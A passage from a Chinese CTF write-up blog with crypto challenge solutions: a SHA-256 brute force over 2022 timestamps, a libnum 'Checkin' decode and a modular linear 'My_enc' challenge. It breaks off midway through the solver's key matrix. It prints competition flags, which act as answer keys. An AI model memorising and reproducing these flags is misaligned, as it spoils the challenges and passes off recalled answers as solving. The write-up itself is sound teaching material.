<h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">61</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(i)) ==<span class="number">1</span>:</span><br><span class="line">                    i = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(j)) ==<span class="number">1</span>:</span><br><span class="line">                    j = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(j)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(k)) == <span class="number">1</span>:</span><br><span class="line">                    k = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(k)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(m)) == <span class="number">1</span>:</span><br><span class="line">                    m = <span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(m)</span><br><span class="line">                tmp = <span class="string">&#x27;2022&#x27;</span>+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)+<span class="built_in">str</span>(k)+<span class="built_in">str</span>(m)</span><br><span class="line">                <span class="comment"># print(tmp)</span></span><br><span class="line">                md = hashlib.sha256()</span><br><span class="line">                md.update(tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> md.hexdigest() == c:</span><br><span class="line">                    <span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment">#catf1ag&#123;202211121750&#125;</span></span><br></pre></td></tr></table></figure>

<p>或者直接在CMD5利用会员解密</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/" rel="tag">2022天权信安&amp;catf1ag</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2023黄河流域公安网络技能挑战赛"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/06/2023%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"
    >2023黄河流域公安网络技能挑战赛</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/06/2023%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/" class="article-date">
  <time datetime="2023-03-06T15:34:28.000Z" itemprop="datePublished">2023-03-06</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>官方wp</p>
<p><a target="_blank" rel="noopener" href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg</a></p>
<p>当时由于比赛时有事就打了一个小时</p>
<h1 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="number">282422904082982258621075610259452215824075271484821245626055284049965141753838118483499225118037659155776469308266679236514939371151200503486860900710638249138056870980395564136760046944176702722154502092895865522544199762580857041717582699398798829888596539858995029585412945532785867079274113878154724845910389733183058666310229884356997245</span>)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mu.Chen_is_the_most_handsome_boy_in_SDPC_and_he_don&#x27;t_have_girlfriend!!!!!!!By_the_way_here_is_your_flag&#123;705bc7ea-e9e1-4996-a28f-dd962a777170&#125;</span><br></pre></td></tr></table></figure>

<h1 id="My-enc"><a href="#My-enc" class="headerlink" title="My_enc"></a>My_enc</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cyber_key</span>(<span class="params">LEN</span>):</span><br><span class="line">    Key = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(LEN):</span><br><span class="line">            Key[x].append(random.randint(<span class="number">0</span>, <span class="number">2023</span>))</span><br><span class="line">    <span class="keyword">return</span> Key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Punk_enc</span>(<span class="params">Key, msg</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> Key:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(l, msg):</span><br><span class="line">            s += (x * y) % P</span><br><span class="line">            s %= P</span><br><span class="line">        out.append(s)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    P = <span class="number">2048</span></span><br><span class="line">    row = <span class="number">66</span></span><br><span class="line">    key = Cyber_key(<span class="built_in">len</span>(flag))</span><br><span class="line">    c = Punk_enc(key, flag)</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">P = <span class="number">2048</span></span><br><span class="line">key = [[<span class="number">505</span>, <span class="number">469</span>, <span class="number">528</span>, <span class="number">1798</span>, <span class="number">373</span>, <span class="number">987</span>, <span class="number">981</span>, <span class="number">438</span>, <span class="number">1438</span>, <span class="number">1918</span>, <span class="number">768</span>, <span class="number">980</span>, <span class="number">720</span>, <span class="number">336</span>, <span class="number">1763</span>, <span class="number">585</span>, <span class="number">1582</span>, <span class="number">1020</span>, <span class="number">601</span>, <span class="number">1543</span>, <span class="number">1374</span>, <span class="number">1904</span>, <span class="number">340</span>, <span class="number">326</span>, <span class="number">947</span>, <span class="number">639</span>, <span class="number">1143</span>, <span class="number">371</span>, <span class="number">359</span>, <span class="number">953</span>, <span class="number">74</span>, <span class="number">657</span>, <span class="number">13</span>, <span class="number">359</span>, <span class="number">280</span>, <span class="number">1903</span>, <span class="number">687</span>, <span class="number">371</span>, <span class="number">114</span>, <span class="number">1232</span>, <span class="number">1573</span>, <span class="number">743</span>], [<span class="number">1310</span>, <span class="number">205</span>, <span class="number">491</span>, <span class="number">137</span>, <span class="number">1743</span>, <span class="number">1185</span>, <span class="number">74</span>, <span class="number">1797</span>, <span class="number">867</span>, <span class="number">755</span>, <span class="number">967</span>, <span class="number">454</span>, <span class="number">800</span>, <span class="number">568</span>, <span class="number">625</span>, <span class="number">492</span>, <span class="number">1835</span>, <span class="number">1586</span>, <span class="number">1462</span>, <span class="number">619</span>, <span class="number">760</span>, <span class="number">1144</span>, <span class="number">98</span>, <span class="number">1764</span>, <span class="number">1356</span>, <span class="number">991</span>, <span class="number">1392</span>, <span class="number">816</span>, <span class="number">849</span>, <span class="number">259</span>, <span class="number">1305</span>, <span class="number">842</span>, <span class="number">1250</span>, <span class="number">1983</span>, <span class="number">1339</span>, <span class="number">752</span>, <span class="number">1170</span>, <span class="number">1976</span>, <span class="number">958</span>, <span class="number">1710</span>, <span class="number">1216</span>, <span class="number">1927</span>], [<span class="number">1507</span>, <span class="number">1699</span>, <span class="number">1536</span>, <span class="number">1708</span>, <span class="number">739</span>, <span class="number">902</span>, <span class="number">1169</span>, <span class="number">1352</span>, <span class="number">886</span>, <span class="number">680</span>, <span class="number">1400</span>, <span class="number">1011</span>, <span class="number">132</span>, <span class="number">1561</span>, <span class="number">1001</span>, <span class="number">772</span>, <span class="number">1809</span>, <span class="number">208</span>, <span class="number">1161</span>, <span class="number">1691</span>, <span class="number">2015</span>, <span class="number">1099</span>, <span class="number">166</span>, <span class="number">1571</span>, <span class="number">551</span>, <span class="number">847</span>, <span class="number">663</span>, <span class="number">749</span>, <span class="number">1634</span>, <span class="number">1487</span>, <span class="number">960</span>, <span class="number">1675</span>, <span class="number">1017</span>, <span class="number">109</span>, <span class="number">63</span>, <span class="number">1714</span>, <span class="number">1540</span>, <span class="number">1515</span>, <span class="number">1382</span>, <span class="number">1569</span>, <span class="number">851</span>, <span class="number">985</span>], [<span class="number">451</span>, <span class="number">1919</span>, <span class="number">680</span>, <span class="number">76</span>, <span class="number">707</span>, <span class="number">1283</span>, <span class="number">933</span>, <span class="number">658</span>, <span class="number">945</span>, <span class="number">1801</span>, <span class="number">352</span>, <span class="number">673</span>, <span class="number">1072</span>, <span class="number">48</span>, <span class="number">1994</span>, <span class="number">1923</span>, <span class="number">1685</span>, <span class="number">1684</span>, <span class="number">1374</span>, <span class="number">28</span>, <span class="number">1774</span>, <span class="number">1769</span>, <span class="number">1388</span>, <span class="number">1541</span>, <span class="number">604</span>, <span class="number">107</span>, <span class="number">1290</span>, <span class="number">787</span>, <span class="number">1622</span>, <span class="number">711</span>, <span class="number">323</span>, <span class="number">1846</span>, <span class="number">317</span>, <span class="number">1519</span>, <span class="number">1426</span>, <span class="number">123</span>, <span class="number">2015</span>, <span class="number">861</span>, <span class="number">544</span>, <span class="number">1401</span>, <span class="number">1869</span>, <span class="number">1833</span>], [<span class="number">862</span>, <span class="number">1316</span>, <span class="number">393</span>, <span class="number">1190</span>, <span class="number">2012</span>, <span class="number">687</span>, <span class="number">78</span>, <span class="number">61</span>, <span class="number">1391</span>, <span class="number">1238</span>, <span class="number">1282</span>, <span class="number">866</span>, <span class="number">1385</span>, <span class="number">1200</span>, <span class="number">292</span>, <span class="number">1702</span>, <span class="number">1599</span>, <span class="number">712</span>, <span class="number">1108</span>, <span class="number">653</span>, <span class="number">1711</span>, <span class="number">745</span>, <span class="number">100</span>, <span class="number">275</span>, <span class="number">322</span>, <span class="number">1671</span>, <span class="number">1723</span>, <span class="number">895</span>, <span class="number">661</span>, <span class="number">1726</span>, <span class="number">497</span>, <span class="number">342</span>, <span class="number">1010</span>, <span class="number">47</span>, <span class="number">1204</span>, <span class="number">1911</span>, <span class="number">1734</span>, <span class="number">1567</span>, <span class="number">1892</span>, <span class="number">954</span>, <span class="number">386</span>, <span class="number">1996</span>], [<span class="number">1333</span>, <span class="number">1928</span>, <span class="number">191</span>, <span class="number">1502</span>, <span class="number">1106</span>, <span class="number">579</span>, <span class="number">779</span>, <span class="number">512</span>, <span class="number">313</span>, <span class="number">308</span>, <span class="number">1277</span>, <span class="number">1547</span>, <span class="number">1814</span>, <span class="number">1434</span>, <span class="number">1867</span>, <span class="number">670</span>, <span class="number">543</span>, <span class="number">404</span>, <span class="number">1570</span>, <span class="number">179</span>, <span class="number">555</span>, <span class="number">1896</span>, <span class="number">289</span>, <span class="number">492</span>, <span class="number">1874</span>, <span class="number">1190</span>, <span class="number">1885</span>, <span class="number">748</span>, <span class="number">1375</span>, <span class="number">401</span>, <span class="number">1685</span>, <span class="number">618</span>, <span class="number">1614</span>, <span class="number">288</span>, <span class="number">2017</span>, <span class="number">571</span>, <span class="number">670</span>, <span class="number">873</span>, <span class="number">98</span>, <span class="number">563</span>, <span class="number">180</span>, <span class="number">749</span>], [<span class="number">262</span>, <span class="number">1072</span>, <span class="number">1188</span>, <span class="number">864</span>, <span class="number">960</span>, <span class="number">1069</span>, <span class="number">1931</span>, <span class="number">870</span>, <span class="number">573</span>, <span class="number">44</span>, <span class="number">38</span>, <span class="number">1525</span>, <span class="number">41</span>, <span class="number">1197</span>, <span class="number">1618</span>, <span class="number">857</span>, <span class="number">187</span>, <span class="number">804</span>, <span class="number">1828</span>, <span class="number">1525</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">1565</span>, <span class="number">419</span>, <span class="number">1397</span>, <span class="number">1487</span>, <span class="number">1902</span>, <span class="number">1150</span>, <span class="number">650</span>, <span class="number">1562</span>, <span class="number">151</span>, <span class="number">564</span>, <span class="number">1836</span>, <span class="number">826</span>, <span class="number">95</span>, <span class="number">158</span>, <span class="number">495</span>, <span class="number">1357</span>, <span class="number">2005</span>, <span class="number">819</span>, <span class="number">783</span>, <span class="number">880</span>], [<span class="number">636</span>, <span class="number">985</span>, <span class="number">809</span>, <span class="number">1165</span>, <span class="number">1478</span>, <span class="number">998</span>, <span class="number">408</span>, <span class="number">1897</span>, <span class="number">988</span>, <span class="number">421</span>, <span class="number">743</span>, <span class="number">1210</span>, <span class="number">1128</span>, <span class="number">1901</span>, <span class="number">943</span>, <span class="number">512</span>, <span class="number">1587</span>, <span class="number">1784</span>, <span class="number">911</span>, <span class="number">857</span>, <span class="number">434</span>, <span class="number">367</span>, <span class="number">1345</span>, <span class="number">104</span>, <span class="number">143</span>, <span class="number">357</span>, <span class="number">426</span>, <span class="number">1169</span>, <span class="number">1876</span>, <span class="number">1111</span>, <span class="number">1355</span>, <span class="number">371</span>, <span class="number">219</span>, <span class="number">1056</span>, <span class="number">432</span>, <span class="number">780</span>, <span class="number">1798</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">1293</span>, <span class="number">807</span>, <span class="number">620</span>], [<span class="number">29</span>, <span class="number">440</span>, <span class="number">1323</span>, <span class="number">1960</span>, <span class="number">1791</span>, <span class="number">1084</span>, <span class="number">777</span>, <span class="number">1314</span>, <span class="number">709</span>, <span class="number">1014</span>, <span class="number">1721</span>, <span class="number">108</span>, <span class="number">3</span>, <span class="number">961</span>, <span class="number">1253</span>, <span class="number">245</span>, <span class="number">862</span>, <span class="number">1899</span>, <span class="number">1519</span>, <span class="number">563</span>, <span class="number">347</span>, <span class="number">870</span>, <span class="number">820</span>, <span class="number">1787</span>, <span class="number">1323</span>, <span class="number">1113</span>, <span class="number">150</span>, <span class="number">1108</span>, <span class="number">1547</span>, <span class="number">1438</span>, <span class="number">845</span>, <span class="number">788</span>, <span class="number">1221</span>, <span class="number">1680</span>, <span class="number">795</span>, <span class="number">923</span>, <span class="number">1308</span>, <span class="number">1114</span>, <span class="number">153</span>, <span class="number">1985</span>, <span class="number">573</span>, <span class="number">132</span>], [<span class="number">1979</span>, <span class="number">1831</span>, <span class="number">1374</span>, <span class="number">601</span>, <span class="number">1736</span>, <span class="number">1778</span>, <span class="number">1390</span>, <span class="number">138</span>, <span class="number">1295</span>, <span class="number">1582</span>, <span class="number">1777</span>, <span class="number">362</span>, <span class="number">647</span>, <span class="number">753</span>, <span class="number">627</span>, <span class="number">142</span>, <span class="number">1732</span>, <span class="number">994</span>, <span class="number">1911</span>, <span class="number">227</span>, <span class="number">1069</span>, <span class="number">1943</span>, <span class="number">1206</span>, <span class="number">1266</span>, <span class="number">1605</span>, <span class="number">827</span>, <span class="number">1153</span>, <span class="number">1375</span>, <span class="number">486</span>, <span class="number">1222</span>, <span class="number">1938</span>, <span class="number">794</span>, <span class="number">909</span>, <span class="number">629</span>, <span class="number">1232</span>, <span class="number">756</span>, <span class="number">935</span>, <span class="number">1374</span>, <span class="number">1148</span>, <span class="number">1312</span>, <span class="number">584</span>, <span class="number">901</span>], [<span class="number">631</span>, <span class="number">136</span>, <span class="number">1835</span>, <span class="number">686</span>, <span class="number">1779</span>, <span class="number">1298</span>, <span class="number">1471</span>, <span class="number">1009</span>, <span class="number">107</span>, <span class="number">906</span>, <span class="number">4</span>, <span class="number">201</span>, <span class="number">859</span>, <span class="number">1808</span>, <span class="number">1743</span>, <span class="number">1286</span>, <span class="number">305</span>, <span class="number">266</span>, <span class="number">1374</span>, <span class="number">992</span>, <span class="number">531</span>, <span class="number">389</span>, <span class="number">1482</span>, <span class="number">362</span>, <span class="number">873</span>, <span class="number">533</span>, <span class="number">341</span>, <span class="number">1357</span>, <span class="number">85</span>, <span class="number">424</span>, <span class="number">207</span>, <span class="number">995</span>, <span class="number">275</span>, <span class="number">857</span>, <span class="number">1239</span>, <span class="number">770</span>, <span class="number">1355</span>, <span class="number">516</span>, <span class="number">178</span>, <span class="number">1560</span>, <span class="number">228</span>, <span class="number">1843</span>], [<span class="number">1863</span>, <span class="number">1423</span>, <span class="number">786</span>, <span class="number">209</span>, <span class="number">1565</span>, <span class="number">1735</span>, <span class="number">1662</span>, <span class="number">1571</span>, <span class="number">749</span>, <span class="number">326</span>, <span class="number">1258</span>, <span class="number">1099</span>, <span class="number">1780</span>, <span class="number">1240</span>, <span class="number">865</span>, <span class="number">810</span>, <span class="number">7</span>, <span class="number">301</span>, <span class="number">1926</span>, <span class="number">692</span>, <span class="number">67</span>, <span class="number">978</span>, <span class="number">1172</span>, <span class="number">641</span>, <span class="number">839</span>, <span class="number">505</span>, <span class="number">1106</span>, <span class="number">423</span>, <span class="number">827</span>, <span class="number">1838</span>, <span class="number">388</span>, <span class="number">1749</span>, <span class="number">483</span>, <span class="number">880</span>, <span class="number">454</span>, <span class="number">773</span>, <span class="number">1961</span>, <span class="number">1153</span>, <span class="number">858</span>, <span class="number">963</span>, <span class="number">92</span>, <span class="number">829</span>], [<span class="number">2009</span>, <span class="number">66</span>, <span class="number">520</span>, <span class="number">1027</span>, <span class="number">1804</span>, <span class="number">882</span>, <span class="number">42</span>, <span class="number">1826</span>, <span class="number">1732</span>, <span class="number">1093</span>, <span class="number">78</span>, <span class="number">1826</span>, <span class="number">1948</span>, <span class="number">734</span>, <span class="number">1486</span>, <span class="number">1285</span>, <span class="number">28</span>, <span class="number">1092</span>, <span class="number">174</span>, <span class="number">292</span>, <span class="number">1412</span>, <span class="number">24</span>, <span class="number">1454</span>, <span class="number">1015</span>, <span class="number">1560</span>, <span class="number">1154</span>, <span class="number">1168</span>, <span class="number">704</span>, <span class="number">1224</span>, <span class="number">1422</span>, <span class="number">784</span>, <span class="number">1353</span>, <span class="number">799</span>, <span class="number">1591</span>, <span class="number">613</span>, <span class="number">1318</span>, <span class="number">1623</span>, <span class="number">1151</span>, <span class="number">968</span>, <span class="number">297</span>, <span class="number">953</span>, <span class="number">1178</span>], [<span class="number">1889</span>, <span class="number">727</span>, <span class="number">1189</span>, <span class="number">160</span>, <span class="number">1198</span>, <span class="number">1338</span>, <span class="number">970</span>, <span class="number">168</span>, <span class="number">1737</span>, <span class="number">1356</span>, <span class="number">1525</span>, <span class="number">590</span>, <span class="number">1773</span>, <span class="number">1397</span>, <span class="number">105</span>, <span class="number">1368</span>, <span class="number">401</span>, <span class="number">1569</span>, <span class="number">287</span>, <span class="number">1757</span>, <span class="number">801</span>, <span class="number">1818</span>, <span class="number">309</span>, <span class="number">1416</span>, <span class="number">1721</span>, <span class="number">1403</span>, <span class="number">1086</span>, <span class="number">583</span>, <span class="number">1203</span>, <span class="number">172</span>, <span class="number">1030</span>, <span class="number">647</span>, <span class="number">1497</span>, <span class="number">1222</span>, <span class="number">1581</span>, <span class="number">432</span>, <span class="number">1199</span>, <span class="number">1279</span>, <span class="number">5</span>, <span class="number">570</span>, <span class="number">556</span>, <span class="number">1936</span>], [<span class="number">1514</span>, <span class="number">1162</span>, <span class="number">130</span>, <span class="number">1023</span>, <span class="number">538</span>, <span class="number">1772</span>, <span class="number">1525</span>, <span class="number">1709</span>, <span class="number">774</span>, <span class="number">1904</span>, <span class="number">1489</span>, <span class="number">837</span>, <span class="number">742</span>, <span class="number">797</span>, <span class="number">446</span>, <span class="number">1240</span>, <span class="number">847</span>, <span class="number">624</span>, <span class="number">1629</span>, <span class="number">2011</span>, <span class="number">867</span>, <span class="number">1097</span>, <span class="number">1814</span>, <span class="number">231</span>, <span class="number">381</span>, <span class="number">46</span>, <span class="number">363</span>, <span class="number">1560</span>, <span class="number">786</span>, <span class="number">1706</span>, <span class="number">800</span>, <span class="number">112</span>, <span class="number">748</span>, <span class="number">745</span>, <span class="number">407</span>, <span class="number">1290</span>, <span class="number">1093</span>, <span class="number">1268</span>, <span class="number">1536</span>, <span class="number">129</span>, <span class="number">1632</span>, <span class="number">1200</span>], [<span class="number">698</span>, <span class="number">1238</span>, <span class="number">1100</span>, <span class="number">591</span>, <span class="number">1166</span>, <span class="number">1320</span>, <span class="number">620</span>, <span class="number">1044</span>, <span class="number">984</span>, <span class="number">744</span>, <span class="number">453</span>, <span class="number">1927</span>, <span class="number">1019</span>, <span class="number">1488</span>, <span class="number">1586</span>, <span class="number">1428</span>, <span class="number">412</span>, <span class="number">42</span>, <span class="number">776</span>, <span class="number">548</span>, <span class="number">2006</span>, <span class="number">409</span>, <span class="number">1767</span>, <span class="number">506</span>, <span class="number">1153</span>, <span class="number">1398</span>, <span class="number">391</span>, <span class="number">1597</span>, <span class="number">1794</span>, <span class="number">1203</span>, <span class="number">1034</span>, <span class="number">180</span>, <span class="number">433</span>, <span class="number">989</span>, <span class="number">1308</span>, <span class="number">1342</span>, <span class="number">1041</span>, <span class="number">1461</span>, <span class="number">782</span>, <span class="number">1284</span>, <span class="number">225</span>, <span class="number">492</span>], [<span class="number">342</span>, <span class="number">15</span>, <span class="number">324</span>, <span class="number">551</span>, <span class="number">329</span>, <span class="number">1427</span>, <span class="number">186</span>, <span class="number">932</span>, <span class="number">774</span>, <span class="number">275</span>, <span class="number">311</span>, <span class="number">1562</span>, <span class="number">1557</span>, <span class="number">455</span>, <span class="number">329</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">856</span>, <span class="number">792</span>, <span class="number">849</span>, <span class="number">878</span>, <span class="number">1362</span>, <span class="number">304</span>, <span class="number">1004</span>, <span class="number">1093</span>, <span class="number">1768</span>, <span class="number">793</span>, <span class="number">366</span>, <span class="number">965</span>, <span class="number">932</span>, <span class="number">1548</span>, <span class="number">759</span>, <span class="number">990</span>, <span class="number">1033</span>, <span class="number">720</span>, <span class="number">1344</span>, <span class="number">1438</span>, <span class="number">481</span>, <span class="number">1546</span>, <span class="number">985</span>, <span class="number">51</span>, <span class="number">1915</span>], [<span class="number">1737</span>, <span class="number">1934</span>, <span class="number">1414</span>, <span class="number">131</span>, <span class="number">1328</span>, <span class="number">919</span>, <span class="number">569</span>, <span class="number">1731</span>, <span class="number">1771</span>, <span class="number">43</span>, <span class="number">1622</span>, <span class="number">322</span>, <span class="number">2000</span>, <span class="number">1918</span>, <span class="number">384</span>, <span class="number">995</span>, <span class="number">1282</span>, <span class="number">1380</span>, <span class="number">449</span>, <span class="number">1566</span>, <span class="number">1981</span>, <span class="number">286</span>, <span class="number">981</span>, <span class="number">704</span>, <span class="number">640</span>, <span class="number">551</span>, <span class="number">5</span>, <span class="number">1019</span>, <span class="number">598</span>, <span class="number">1079</span>, <span class="number">1150</span>, <span class="number">209</span>, <span class="number">464</span>, <span class="number">1555</span>, <span class="number">2</span>, <span class="number">1988</span>, <span class="number">1305</span>, <span class="number">127</span>, <span class="number">152</span>, <span class="number">701</span>, <span class="number">553</span>, <span class="number">1030</span>], [<span class="number">817</span>, <span class="number">176</span>, <span class="number">737</span>, <span class="number">657</span>, <span class="number">1507</span>, <span class="number">514</span>, <span class="number">1453</span>, <span class="number">1656</span>, <span class="number">1229</span>, <span class="number">315</span>, <span class="number">368</span>, <span class="number">332</span>, <span class="number">460</span>, <span class="number">933</span>, <span class="number">1553</span>, <span class="number">1409</span>, <span class="number">1137</span>, <span class="number">1910</span>, <span class="number">209</span>, <span class="number">1906</span>, <span class="number">1487</span>, <span class="number">571</span>, <span class="number">996</span>, <span class="number">1489</span>, <span class="number">2011</span>, <span class="number">245</span>, <span class="number">1510</span>, <span class="number">115</span>, <span class="number">1155</span>, <span class="number">349</span>, <span class="number">67</span>, <span class="number">620</span>, <span class="number">759</span>, <span class="number">699</span>, <span class="number">1034</span>, <span class="number">1030</span>, <span class="number">984</span>, <span class="number">70</span>, <span class="number">1585</span>, <span class="number">1580</span>, <span class="number">121</span>, <span class="number">2</span>], [<span class="number">526</span>, <span class="number">1875</span>, <span class="number">273</span>, <span class="number">1552</span>, <span class="number">641</span>, <span class="number">532</span>, <span class="number">613</span>, <span class="number">1092</span>, <span class="number">72</span>, <span class="number">1518</span>, <span class="number">600</span>, <span class="number">1380</span>, <span class="number">1088</span>, <span class="number">1371</span>, <span class="number">143</span>, <span class="number">1764</span>, <span class="number">1695</span>, <span class="number">1747</span>, <span class="number">1693</span>, <span class="number">2006</span>, <span class="number">614</span>, <span class="number">305</span>, <span class="number">1784</span>, <span class="number">1474</span>, <span class="number">1761</span>, <span class="number">730</span>, <span class="number">1968</span>, <span class="number">1803</span>, <span class="number">520</span>, <span class="number">917</span>, <span class="number">1976</span>, <span class="number">838</span>, <span class="number">525</span>, <span class="number">1769</span>, <span class="number">2005</span>, <span class="number">1625</span>, <span class="number">128</span>, <span class="number">728</span>, <span class="number">1729</span>, <span class="number">440</span>, <span class="number">288</span>, <span class="number">1530</span>], [<span class="number">17</span>, <span class="number">1580</span>, <span class="number">403</span>, <span class="number">1813</span>, <span class="number">1514</span>, <span class="number">1603</span>, <span class="number">559</span>, <span class="number">1845</span>, <span class="number">408</span>, <span class="number">1942</span>, <span class="number">966</span>, <span class="number">1393</span>, <span class="number">544</span>, <span class="number">272</span>, <span class="number">1400</span>, <span class="number">1940</span>, <span class="number">412</span>, <span class="number">1968</span>, <span class="number">837</span>, <span class="number">945</span>, <span class="number">503</span>, <span class="number">409</span>, <span class="number">154</span>, <span class="number">264</span>, <span class="number">379</span>, <span class="number">218</span>, <span class="number">1847</span>, <span class="number">966</span>, <span class="number">1103</span>, <span class="number">125</span>, <span class="number">1935</span>, <span class="number">1381</span>, <span class="number">1552</span>, <span class="number">126</span>, <span class="number">1379</span>, <span class="number">397</span>, <span class="number">735</span>, <span class="number">1165</span>, <span class="number">162</span>, <span class="number">1696</span>, <span class="number">44</span>, <span class="number">238</span>], [<span class="number">1401</span>, <span class="number">75</span>, <span class="number">99</span>, <span class="number">633</span>, <span class="number">922</span>, <span class="number">1093</span>, <span class="number">831</span>, <span class="number">1422</span>, <span class="number">1489</span>, <span class="number">46</span>, <span class="number">728</span>, <span class="number">1191</span>, <span class="number">292</span>, <span class="number">473</span>, <span class="number">640</span>, <span class="number">423</span>, <span class="number">766</span>, <span class="number">1991</span>, <span class="number">1561</span>, <span class="number">1897</span>, <span class="number">583</span>, <span class="number">385</span>, <span class="number">409</span>, <span class="number">1814</span>, <span class="number">1684</span>, <span class="number">879</span>, <span class="number">1414</span>, <span class="number">160</span>, <span class="number">1870</span>, <span class="number">577</span>, <span class="number">1394</span>, <span class="number">1088</span>, <span 